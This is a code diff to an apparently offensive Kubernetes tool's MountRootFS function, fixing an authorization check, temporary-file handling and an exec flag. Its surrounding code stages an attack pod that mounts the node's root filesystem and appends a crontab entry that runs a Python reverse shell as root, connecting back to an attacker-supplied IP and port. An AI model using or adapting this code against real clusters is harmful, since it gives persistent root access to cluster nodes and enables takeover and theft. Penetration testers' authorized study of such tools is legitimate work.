@@ -47,7 +47,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 	var err error
 
 	// First, confirm we're allowed to create pods
-	if !kubectlAuthCanI(connectionString, "create", "pod") {
+	if !kubectlAuthCanI(connectionString, "create", "pods") {
 		println("[-] AUTHORIZATION: this token isn't allowed to create pods in this namespace")
 		return
 	}
@@ -161,7 +161,13 @@ spec:
 		return
 	}
 
-	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
+	if err := manifestTmpFile.Close(); err != nil {
+		println("[-] Unable to close temporary pod manifest.")
+		return
+	}
+	defer os.Remove(manifestTmpFile.Name())
+
+	_, _, err = runKubectlSimple(connectionString, "apply", "-f", manifestTmpFile.Name())
 	if err != nil {
 		println("[-] Pod did not stage successfully.")
 		return
@@ -173,7 +179,7 @@ spec:
 	stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
 	stdout := bytes.Buffer{}
 	stderr := bytes.Buffer{}
-	err = runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")
+	err = runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-i", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")
 	if err != nil {
 		// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
 		println("[-] Exec into that pod failed. If your privileges do permit this, the pod may have needed more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
